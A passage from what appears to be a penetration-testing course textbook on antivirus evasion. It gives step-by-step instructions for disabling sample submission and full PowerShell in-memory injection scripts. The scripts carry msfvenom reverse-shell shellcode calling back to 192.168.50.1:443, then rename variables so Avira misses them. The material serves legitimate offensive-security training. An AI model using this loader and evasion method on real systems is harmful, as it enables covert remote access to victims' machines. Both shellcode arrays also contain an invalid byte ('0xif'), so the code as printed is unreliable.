### Creating a Dedicated Testing Environment

To closely replicate the customer environment, it is essential to build a dedicated virtual machine (VM). This ensures that the testing conditions are as realistic as possible. Regardless of the antivirus (AV) product being tested, always disable sample submission features. This prevents the same drawbacks associated with services like VirusTotal, where samples can be analyzed and shared.

For example, in Windows Defender, the Automatic Sample Submission feature can be disabled by navigating to:
- **Windows Security** > **Virus & threat protection** > **Manage settings** > **Virus & threat protection settings** > **Submit samples**.
- Deselect the option to submit samples, as shown in Figure 195.

**Figure 195: Disabling Windows Defender Automated Sample Submission**

This simulated target scenario allows for the free testing of AV evasion techniques without the risk of sample submission for further analysis. Since automatic sample submission enables Windows Defender to analyze samples using its cloud-based machine learning engines, this feature should only be enabled if you are confident in your bypasses and if the target environment has sample submission enabled.

Both Windows Defender's cloud protection and automatic sample submission require internet connectivity. Therefore, it is crucial to verify that the target environment reflects these conditions. Some company policies may restrict internet access on production servers, thereby inhibiting advanced AV features.

### Best Practices for Developing AV Bypasses

When developing AV bypasses, it is a best practice to use custom code. As discussed earlier, AV signatures are derived from malware samples. The more novel and diversified your code, the less likely it is to match existing detection signatures.

### Evading AV with Thread Injection

#### Understanding Detection Techniques and Bypass Methods

Finding a universal solution to bypass all antivirus products is challenging and often impractical. Given the time constraints of a typical penetration test, it is more efficient to target the specific AV product deployed in the target network.

For this module, we will interact with Avira Free Security version 1.1.68.29553 on a Windows 11 client. After connecting via Remote Desktop Protocol (RDP) with the provided credentials, launch Avira from the desktop shortcut. Navigate to the **Security** panel from the left menu and click on **Protection Options** to verify and enable the Real-Time Protection feature, as shown in Figures 196 and 197.

**Figure 196: Searching for Protection Options in the Avira Menu**

**Figure 197: Avira Control Center**

#### Verifying AV Functionality

As a first step, ensure that the antivirus is functioning correctly. Use the Metasploit payload generated earlier and scan it with Avira. Transfer the malicious Portable Executable (PE) to the Windows client. If the file is detected as malicious, Avira will block and quarantine it, as shown in Figure 198.

**Figure 198: Avira Free Antivirus Quarantine Message**

Antivirus products typically enforce threat quarantine by blocking file system operations at the kernel level or storing malicious samples in encrypted storage accessible only by the AV software.

Depending on the restrictions in the target environment, PowerShell can be used to bypass antivirus products. In the following example, we will use a remote process memory injection technique, similar to what was learned in the previous unit. The main difference is that we will target the currently executing process, which in this case is the x86 PowerShell interpreter.

#### PowerShell Script for Memory Injection

PowerShell's ability to interact with the Windows API allows us to implement the in-memory injection process in a script. This makes it difficult for antivirus manufacturers to determine if the script is malicious, as it runs inside an interpreter and the script itself is not executable code.

Here is a basic templated script that performs in-memory injection:

```powershell
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

$winFunc = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;
[Byte[]]$sc = 0xfc,0xe8,0x82,0x0,0x0,0x0,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0xc,0x8b,0x52,0x14,0x8b,0x72,0x28,0xif,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0xc1,0xcf,0xd,0x1,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x1,0xd1,0x51,0x8b,0x59,0x20,0x1,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x1,0xd6,0x31,0xff,0xac,0xc1,0xcf,0xd,0x1,0xc7,0x38,0xe0,0x75,0xf6,0x3,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x1,0xd3,0x66,0x8b,0xc,0x4b,0x8b,0x58,0x1c,0x1,0xd3,0x8b,0x4,0x8b,0x1,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x0,0x0,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x7,0xff,0xd5,0xb8,0x90,0x1,0x0,0x0,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x0,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0xf,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x5,0x68,0xc0,0xa8,0x32,0x1,0x68,0x2,0x0,0x1,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0xc,0xff,0x4e,0x8,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x68,0x63,0x6d,0x64,0x0,0x89,0xe3,0x57,0x57,0x57,0x31,0xf6,0x6a,0x12,0x59,0x56,0xe2,0xfd,0x66,0xc7,0x44,0x24,0x3c,0x1,0x1,0x8d,0x44,0x24,0x10,0xc6,0x0,0x44,0x54,0x50,0x56,0x56,0x56,0x46,0x56,0x4e,0x56,0x56,0x53,0x56,0x68,0x79,0xcc,0x3f,0x86,0xff,0xd5,0x89,0xe0,0x4e,0x56,0x46,0xff,0x30,0x68,0x8,0x87,0x1d,0x60,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x3c,0x6,0x7c,0xa,0x80,0xfb,0xe0,0x75,0x5,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x0,0x53,0xff,0xd5;

$size = 0x1000;
if ($sc.Length -gt 0x1000) {$size = $sc.Length};
$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);
for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};
$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
```

The script imports `VirtualAlloc`, `CreateThread`, and `memset` from the Windows API. It allocates memory, writes the payload to the allocated memory, and executes it in a new thread.

#### Generating the Payload

Generate the payload using `msfvenom`:

```bash
kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f powershell -v sc
...
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 699 bytes
Final size of powershell file: 3454 bytes
```

Copy the resulting payload into the `$sc` variable in the PowerShell script.

#### Testing the Script

Upload the PowerShell script to the target Windows 11 client and run a Quick Scan in Avira to verify that the script is undetected. To run the scan, navigate to:
- **Security** > **Virus Scans** > **Quick Scan**.

If Avira indicates that the script is not malicious, the bypass is successful.

**Figure 199: VirusTotal results for in-memory injection in PowerShell**

According to the VirusTotal scan, 28 out of 59 AV products flagged the script as malicious, including Avira. To improve the bypass, rename the variables in the script to more generic names:

```powershell
$var2 = Add-Type -memberDefinition $code -Name "iWin32" -namespace Win32Functions -passthru;
[Byte[]];
[Byte[]] $var1 = 0xfc,0xe8,0x8f,0x0,0x0,0x0,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0xc,0x8b,0x52,0x14,0x8b,0x72,0x28,0xif,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0xc1,0xcf,0xd,0x1,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x1,0xd1,0x51,0x8b,0x59,0x20,0x1,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x1,0xd6,0x31,0xff,0xac,0xc1,0xcf,0xd,0x1,0xc7,0x38,0xe0,0x75,0xf6,0x3,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x1,0xd3,0x66,0x8b,0xc,0x4b,0x8b,0x58,0x1c,0x1,0xd3,0x8b,0x4,0x8b,0x1,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x0,0x0,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x7,0xff,0xd5,0xb8,0x90,0x1,0x0,0x0,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x0,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0xf,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x5,0x68,0xc0,0xa8,0x32,0x1,0x68,0x2,0x0,0x1,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0xc,0xff,0x4e,0x8,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x68,0x63,0x6d,0x64,0x0,0x89,0xe3,0x57,0x57,0x57,0x31,0xf6,0x6a,0x12,0x59,0x56,0xe2,0xfd,0x66,0xc7,0x44,0x24,0x3c,0x1,0x1,0x8d,0x44,0x24,0x10,0xc6,0x0,0x44,0x54,0x50,0x56,0x56,0x56,0x46,0x56,0x4e,0x56,0x56,0x53,0x56,0x68,0x79,0xcc,0x3f,0x86,0xff,0xd5,0x89,0xe0,0x4e,0x56,0x46,0xff,0x30,0x68,0x8,0x87,0x1d,0x60,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x3c,0x6,0x7c,0xa,0x80,0xfb,0xe0,0x75,0x5,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x0,0x53,0xff,0xd5;

$size = 0x1000;
if ($var1.Length -gt 0x1000) {$size = $var1.Length};
$x = $var2::VirtualAlloc(0,$size,0x3000,0x40);
for ($i=0;$i -le ($var1.Length-1);$i++) {$var2::memset([IntPtr]($x.ToInt32()+$i), $var1[$i], 1)};
$var2::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
```

Save the modified script as `bypass.ps1` and transfer it to the target Windows 11 client. Run a Quick Scan in Avira to verify that the script is undetected.

**PWK - Copyright Â© 2023 OffSec Services Limited. All rights reserved. 368**
**Made in Morocco**
**Penetration Testing with Kali Linux**